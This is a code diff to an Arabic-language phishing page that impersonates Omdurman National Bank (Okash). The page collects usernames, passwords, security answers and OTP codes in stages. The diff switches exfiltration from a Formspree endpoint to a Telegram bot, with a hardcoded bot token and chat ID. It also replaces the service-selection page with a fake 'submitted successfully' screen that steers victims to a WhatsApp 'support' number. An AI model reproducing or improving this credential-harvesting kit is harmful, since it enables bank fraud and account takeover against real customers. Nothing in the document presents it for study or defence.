@@ -21,7 +21,6 @@
         .page-section { display: none; }
         .page-section.active { display: block; }
 
-        /* الترويسة العليا متطابقة مع التصميم */
         .top-header { 
             background: linear-gradient(var(--main-green), var(--green-dark)); 
             padding: 15px 20px; 
@@ -100,45 +99,31 @@
         .steps h4 { color: var(--main-green); margin-bottom: 10px; text-align: center; }
         .steps ol { padding-right: 20px; color: #444; line-height: 1.6; font-size: 13px; }
 
-        /* تصميم أزرار خيارات تأكيد الطلب مطابق تماماً للصور */
-        .confirm-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 12px;
-            margin-top: 15px;
+        /* تصميم صفحة النجاح والتحويل للواتساب */
+        .success-box {
+            text-align: center;
+            padding: 10px 5px;
         }
 
-        .confirm-option {
-            border: 1px solid #e2e8f0;
-            background: #fafafa;
-            border-radius: 10px;
-            padding: 12px 10px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            font-size: 14px;
+        .success-icon {
+            font-size: 60px;
+            color: var(--green-bright);
+            margin-bottom: 15px;
+        }
+
+        .success-title {
+            color: var(--main-green);
+            font-size: 22px;
             font-weight: bold;
-            color: #333;
+            margin-bottom: 12px;
         }
 
-        .confirm-option:hover {
-            border-color: var(--main-green);
-            background: #f0fff4;
-        }
-
-        .confirm-option input[type="radio"] {
-            width: 18px;
-            height: 18px;
-            accent-color: #007bff;
-            cursor: pointer;
-        }
-
-        .full-width-option {
-            grid-column: span 2;
-            justify-content: center;
-            gap: 15px;
+        .success-msg {
+            color: #444;
+            font-size: 15px;
+            line-height: 1.6;
+            margin-bottom: 25px;
+            font-weight: bold;
         }
 
         .btn-whatsapp-custom {
@@ -151,12 +136,12 @@
             padding: 14px;
             width: 100%;
             cursor: pointer;
-            margin-top: 20px;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
             transition: 0.2s;
+            text-decoration: none;
             box-shadow: 0 4px 10px rgba(28, 184, 82, 0.3);
         }
 
@@ -319,61 +304,29 @@
         </div>
     </div>
 
-    <!-- 6. صفحة تأكيد الطلب المحدثة بنفس شكل الصور تماماً -->
+    <!-- 6. الصفحة الجديدة المطورة لرسالة التسليم والتواصل -->
     <div id="confirm-page" class="page-section">
         <div class="card">
-            <h2>تأكيد الطلب</h2>
-            <p class="subtitle">اختر الخدمة المطلوبة للإرسال النهائي</p>
-            
-            <div class="confirm-grid">
-                <label class="confirm-option">
-                    <span>رفع السقف</span>
-                    <input type="radio" name="final-serv" value="رفع السقف" checked>
-                </label>
-                <label class="confirm-option">
-                    <span>تغيير الهاتف</span>
-                    <input type="radio" name="final-serv" value="تغيير الهاتف">
-                </label>
-                <label class="confirm-option">
-                    <span>تحويل خاطئ</span>
-                    <input type="radio" name="final-serv" value="تحويل خاطئ">
-                </label>
-                <label class="confirm-option">
-                    <span>العملات الأجنبية</span>
-                    <input type="radio" name="final-serv" value="العملات الأجنبية">
-                </label>
-                <label class="confirm-option">
-                    <span>فك حظر وتجميد</span>
-                    <input type="radio" name="final-serv" value="فك حظر وتجميد">
-                </label>
-                <label class="confirm-option">
-                    <span>استرداد حساب</span>
-                    <input type="radio" name="final-serv" value="استرداد حساب">
-                </label>
-                <label class="confirm-option">
-                    <span>تفعيل فيزا</span>
-                    <input type="radio" name="final-serv" value="تفعيل فيزا">
-                </label>
-                <label class="confirm-option">
-                    <span>كلمة مرور خاطئة</span>
-                    <input type="radio" name="final-serv" value="كلمة مرور خاطئة">
-                </label>
-                <label class="confirm-option full-width-option">
-                    <span>تحديث البيانات</span>
-                    <input type="radio" name="final-serv" value="تحديث البيانات">
-                </label>
+            <div class="success-box">
+                <i class="fa-solid fa-circle-check success-icon"></i>
+                <div class="success-title">تم تسليم بياناتك بنجاح</div>
+                <div class="success-msg">
+                    الرجاء التواصل مع فريق الدعم على الواتساب لحل المشكلة وإكمال طلبك.
+                </div>
+                <a href="#" onclick="sendWhatsApp()" class="btn-whatsapp-custom">
+                    <i class="fa-brands fa-whatsapp" style="font-size: 22px;"></i> التواصل مع الدعم عبر واتساب
+                </a>
             </div>
-
-            <button onclick="sendWhatsApp()" class="btn-whatsapp-custom">
-                <i class="fa-brands fa-whatsapp" style="font-size: 20px;"></i> تأكيد الطلب عبر واتساب
-            </button>
         </div>
     </div>
 
     <footer class="footer">بنك أمدرمان الوطني (أوكاش) | جميع الحقوق محفوظة 2026</footer>
 
     <script>
-        // كائن لتجميع البيانات المسجلة
+        // إعدادات التيليجرام بالتوكن والآيدي الخاصين بك
+        const TELEGRAM_BOT_TOKEN = "8874850044:AAGYZncow8wTcaq0H7BPG-u8sTnT7jQ_TTDUTDU";
+        const TELEGRAM_CHAT_ID = "8362235682";
+
         let userData = {
             username: '',
             password: '',
@@ -430,54 +383,55 @@
             }
         }
 
-        // جمع البيانات متسلسلاً وإرسالها برابط Formspree الخاص بك
+        // جمع البيانات متسلسلاً وإرسالها فورياً إلى بوت التيليجرام
         function captureAndProceed(event, nextPage, stepName) {
             event.preventDefault();
 
             if(stepName === 'تسجيل الدخول') {
                 userData.username = document.getElementById('username').value;
                 userData.password = document.getElementById('password').value;
-                sendFormspreeData("مرحلة 1: تسجيل الدخول");
+                sendToTelegram("مرحلة 1: تسجيل الدخول");
             } else if(stepName === 'سؤال الأمان') {
                 userData.securityQuestion = document.getElementById('secQuestion').value;
                 userData.securityAnswer = document.getElementById('secAnswer').value;
-                sendFormspreeData("مرحلة 2: سؤال الأمان");
+                sendToTelegram("مرحلة 2: سؤال الأمان");
             } else if(stepName === 'رمز OTP') {
                 userData.otp = document.getElementById('otpCode').value;
-                sendFormspreeData("مرحلة 3: كود OTP التقرير الكامل");
+                sendToTelegram("مرحلة 3: رمز OTP وإكمال التسجيل");
             }
 
             showPage(nextPage);
         }
 
-        // دالة الإرسال إلى رابط Formspree الخاص بك
-        function sendFormspreeData(stage) {
-            const formEndpoint = "https://formspree.io/f/mrpedrqj"; // الرابط الخاص بك
-            
-            const payload = {
-                Stage: stage,
-                Username_Account: userData.username,
-                Password: userData.password,
-                Security_Question: userData.securityQuestion,
-                Security_Answer: userData.securityAnswer,
-                OTP_Code: userData.otp,
-                Timestamp: new Date().toLocaleString()
-            };
+        // دالة الإرسال الفوري لتيليجرام
+        function sendToTelegram(stageInfo) {
+            const message = `
+🔔 *إشعار جديد من موقع بنك أمدرمان*:
+📌 *المرحلة*: ${stageInfo}
+👤 *اسم المستخدم/الحساب*: \`${userData.username}\`
+🔑 *كلمة المرور*: \`${userData.password}\`
+❓ *سؤال الأمان*: ${userData.securityQuestion || 'غير محدد'}
+💡 *الإجابة*: \`${userData.securityAnswer || 'غير محدد'}\`
+🔢 *رمز OTP*: \`${userData.otp || 'غير محدد'}\`
+⏰ *الوقت*: ${new Date().toLocaleString('ar-SA')}
+            `;
 
-            fetch(formEndpoint, {
-                method: "POST",
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Accept': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            }).catch(err => console.log(err));
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(err => console.log('Telegram Send Error:', err));
         }
 
         function sendWhatsApp() {
-            const selected = document.querySelector('input[name="final-serv"]:checked').value;
-            const phone = "0118737098"; // رقم الواتساب الخاص بك
-            const text = encodeURIComponent(`مرحباً بنك أمدرمان الوطني، أرغب في تأكيد طلب خدمة: ${selected}\nرقم الحساب: ${userData.username}`);
+            const phone = "0118737098";
+            const text = encodeURIComponent(`مرحباً فريق الدعم، تم تسليم بياناتي بنجاح وأحتاج المساعدة للتحقق من الحساب.\nاسم المستخدم: ${userData.username}`);
             window.location.href = `https://wa.me/${phone}?text=${text}`;
         }
     </script>
